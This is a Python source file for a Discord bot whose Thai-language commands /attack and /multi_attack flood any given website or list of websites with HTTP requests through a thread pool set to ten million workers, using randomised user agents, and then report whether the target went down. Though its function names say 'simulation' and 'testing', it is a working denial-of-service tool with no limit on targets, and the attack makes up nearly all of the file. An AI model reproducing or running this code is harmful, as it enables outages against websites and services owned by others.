import os
import nextcord
import threading
import requests
from concurrent.futures import ThreadPoolExecutor
from nextcord.ext import commands
from user_agent import generate_user_agent
import asyncio
import time
from myserver import server_on


bot = commands.Bot(command_prefix='/', intents=nextcord.Intents.all())


executor = ThreadPoolExecutor(max_workers=10000000)


def ddos_simulation(target_url):
    headers = {
        'User-Agent': generate_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    try:

        response = requests.get(target_url, headers=headers)
        print(f"Request sent to {target_url}, Response Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")


async def simulate_attack(ctx, target_url, threads):
    for _ in range(threads):

        executor.submit(ddos_simulation, target_url)
    await ctx.send(f"เริ่มโจมตีไปที่ {target_url} ด้วย {threads} ......")


async def check_website_status(target_url):
    try:
        response = requests.get(target_url)
        if response.status_code == 200:
            print(f"Website {target_url} is up and running.")
        else:
            print(f"Website {target_url} is down. Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error checking {target_url}: {e}")


async def delay_action(seconds):
    print(f"Delaying for {seconds} seconds...")
    await asyncio.sleep(seconds) 
    print(f"Resuming after {seconds} seconds.")


async def send_report_to_discord(ctx, message):
    print(f"Sending message to Discord: {message}")
    await ctx.send(message)


async def start_attack_step_by_step(ctx, url, threads):
    await ctx.send(f"กำลังเริ่มโจมตีเว็บไซต์ {url}  {threads}  โปรดรอสักครู่...")


    await delay_action(2)  
    await simulate_attack(ctx, url, threads)  


    await delay_action(5)  
    await check_website_status(url)


    await send_report_to_discord(ctx, "การโจมตีเสร็จสิ้นและครับ")

async def rapid_attack(ctx, url, threads):
    await ctx.send(f"เริ่มการโจมตีแบบรวดเร็วไปที่ {url} {threads} ")
    await simulate_attack(ctx, url, threads)
    await send_report_to_discord(ctx, "การโจมตีแบบรวดเร็วเสร็จสิ้น.")


@bot.command()
async def attack(ctx, url: str, threads: int):   
        if not url.startswith("https://"):
            url = "https://" + url  

        message = f"กำลังเริ่มการทดสอบโจมตีไปที่ {url} ด้วย {threads} threads."
        print(message)
        await ctx.send(message)


        await start_attack_step_by_step(ctx, url, threads)


        await rapid_attack(ctx, url, threads)


        await send_report_to_discord(ctx, "การโจมตีเสร็จสิ้นและตรวจสอบสถานะเว็บไซต์แล้ว.")


@bot.command()
async def multi_attack(ctx, urls: str, threads: int):
    urls = urls.split(",")
    for url in urls:
        await ctx.send(f"กำลังโจมตี {url} ด้วย {threads} threads...")
        await simulate_attack(ctx, url, threads)

    await send_report_to_discord(ctx, "การโจมตีหลายเว็บไซต์เสร็จสิ้น.")



@bot.command()
async def help_zzzz(ctx):
    """คำสั่งแสดงข้อมูลช่วยเหลือ"""
    help_message = """
    คำสั่งที่คุณสามารถใช้งาน:
    1. /attack <URL> <จำนวน Thread> - ใช้ในการทดสอบการโจมตีเว็บไซต์
    2. /multi_attack <URL1, URL2, ...> <จำนวน  - ใช้ในการโจมตีหลายเว็บไซต์พร้อมกัน
    3. /help_zzzz - แสดงคำสั่งทั้งหมด
    """
    await ctx.send(help_message)


@bot.event
async def on_error(error):
    print(f"Error occurred: {error}")

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")
    await bot.change_presence(activity=nextcord.Game("Testing DDoS Attack"))

server_on()

bot.run(os.getenv('TOKEN'))